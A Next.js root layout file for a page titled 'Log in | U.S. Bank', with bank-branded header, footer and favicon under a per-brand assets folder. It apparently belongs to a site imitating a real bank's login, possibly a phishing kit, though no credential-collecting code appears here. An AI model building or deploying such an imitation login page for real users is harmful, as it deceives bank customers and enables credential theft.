import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";
import Script from "next/script";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "Log in | U.S. Bank",
  description: "Log in to your U.S. Bank account",
  icons: {
    icon: '/brands/us-bank/favicon.ico',
  },
};

import { USBankHeader } from "@/components/layout/USBankHeader";
import { USBankFooter } from "@/components/layout/USBankFooter";
import { USBankFeedbackButton } from "@/components/layout/USBankFeedbackButton";

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        <Script src="/config.js" strategy="beforeInteractive" />
        <div className="app-container">
          <USBankHeader />
          <main className="main-content">
            {children}
          </main>
          <USBankFooter />
          <USBankFeedbackButton />
        </div>
      </body>
    </html>
  );
}
